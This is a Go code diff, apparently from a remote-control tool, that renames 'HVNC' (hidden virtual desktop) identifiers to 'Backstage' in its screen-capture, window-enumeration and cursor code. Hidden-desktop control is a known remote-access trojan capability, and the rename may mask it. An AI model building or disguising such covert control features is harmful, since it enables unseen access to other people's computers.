@@ -294,7 +294,7 @@ func (s *virtualDuplicationState) encodeCachedDirectH264(capStart time.Time, wid
 	if len(out) == 0 {
 		return wire.Frame{}, time.Since(capStart), encodeDur, true, nil
 	}
-	return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: 0, FPS: 0, Format: "h264", HVNC: true}, Data: out}, time.Since(capStart), encodeDur, true, nil
+	return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: 0, FPS: 0, Format: "h264", Backstage: true}, Data: out}, time.Since(capStart), encodeDur, true, nil
 }
 
 func (s *virtualDuplicationState) cacheDirectH264Texture(src *d3d11Texture2D, srcDesc d3d11Texture2DDesc) error {
@@ -939,7 +939,7 @@ func VirtualKillAll() error {
 	return nil
 }
 
-func VirtualEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
+func VirtualEnumWindows() ([]BackstageWindowInfo, []BackstageMonitorInfo) {
 	virtualMu.Lock()
 	bounds := virtualMonitorBounds
 	name := virtualMonitorName
@@ -950,7 +950,7 @@ func VirtualEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
 		return nil, nil
 	}
 
-	monInfos := []HVNCMonitorInfo{{
+	monInfos := []BackstageMonitorInfo{{
 		Index:   0,
 		Name:    name,
 		X:       bounds.Min.X,
@@ -973,7 +973,7 @@ func VirtualEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
 	deskHwnd, _, _ := procGetDesktopWindow.Call()
 	procEnumDesktopWindows.Call(deskHwnd, cb, 0)
 
-	var result []HVNCWindowInfo
+	var result []BackstageWindowInfo
 	for _, w := range windowList {
 		if !isWindowVisible(w.hwnd) {
 			continue
@@ -1010,7 +1010,7 @@ func VirtualEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
 			monIdx = 0
 		}
 
-		result = append(result, HVNCWindowInfo{
+		result = append(result, BackstageWindowInfo{
 			HWND:        w.hwnd,
 			Title:       title,
 			X:           winLeft,
@@ -2221,7 +2221,7 @@ func virtualCurrentCursor() point {
 	}
 	virtualInputMu.Unlock()
 	var pt point
-	procGetCursorPosHVNC.Call(uintptr(unsafe.Pointer(&pt)))
+	procGetCursorPosbackstage.Call(uintptr(unsafe.Pointer(&pt)))
 	return pt
 }
 
@@ -2397,7 +2397,7 @@ func VirtualCaptureDisplayFallback() (*image.RGBA, error) {
 	capW := srcW
 	capH := srcH
 
-	hdcScreen, hdcMem, buf, ok := hvncEnsureCapCache(capW, capH)
+	hdcScreen, hdcMem, buf, ok := backstageEnsureCapCache(capW, capH)
 	if !ok {
 		return nil, syscall.EINVAL
 	}
@@ -2443,8 +2443,8 @@ func drawVirtualWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, targe
 		return 0
 	}
 
-	if hvncWinCache == nil {
-		hvncWinCache = make(map[uintptr]*hvncWinCacheEntry)
+	if backstageWinCache == nil {
+		backstageWinCache = make(map[uintptr]*backstageWinCacheEntry)
 	}
 
 	alive := make(map[uintptr]bool)
@@ -2476,17 +2476,17 @@ func drawVirtualWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, targe
 			continue
 		}
 
-		if drawHVNCWindow(hdcScreen, hwnd, bounds, target, targetStride) {
+		if drawbackstageWindow(hdcScreen, hwnd, bounds, target, targetStride) {
 			drawn++
 		}
 		alive[hwnd] = true
 		hwnd = getWindow(hwnd, GW_HWNDPREV)
 	}
 
-	for h, entry := range hvncWinCache {
+	for h, entry := range backstageWinCache {
 		if !alive[h] {
-			hvncFreeCacheEntry(entry)
-			delete(hvncWinCache, h)
+			backstageFreeCacheEntry(entry)
+			delete(backstageWinCache, h)
 		}
 	}
 
